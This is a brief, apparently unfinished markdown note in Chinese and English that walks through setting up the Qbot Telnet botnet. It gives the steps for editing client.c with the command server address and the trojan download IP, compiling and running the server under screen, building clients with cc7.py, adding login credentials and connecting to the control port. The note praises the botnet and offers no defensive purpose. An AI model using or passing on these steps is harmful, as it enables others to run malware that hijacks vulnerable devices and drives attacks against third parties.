# 待补充
## qbot
Qbot Botnet. Telnet botnet, most powerfull and strong botnet. requirements: 2 linux server.

yum install wget git gcc python2 python3 tar bzip2 


1. 修改client.c
commServer ip:port1
以及木马下载ip

2. 安装gcc screen python vim  tar tar bzip2

apt-get install gcc screen python2 python3 vim   tar bzip2 

3. 编译server
gcc -o server server.c -pthread


screen ./server port1 port2 port3
screen ./server 2323  7777 10000

port3 > port2

 
CTRL + A + D //退出screen


python2 cc7.py client.c ip

新建login.txt

username password


putty
ip port3 
